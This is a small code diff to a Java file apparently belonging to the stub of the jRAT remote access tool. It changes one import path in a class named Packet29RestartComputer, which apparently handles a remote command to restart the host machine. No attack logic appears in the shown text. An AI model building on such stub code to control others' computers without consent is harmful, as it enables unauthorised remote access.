@@ -2,8 +2,7 @@ package io.jrat.stub.packets.incoming;
 
 import io.jrat.stub.Connection;
 import io.jrat.stub.Constants;
-
-import com.redpois0n.oslib.OperatingSystem;
+import oslib.OperatingSystem;
 
 public class Packet29RestartComputer extends AbstractIncomingPacket {
 
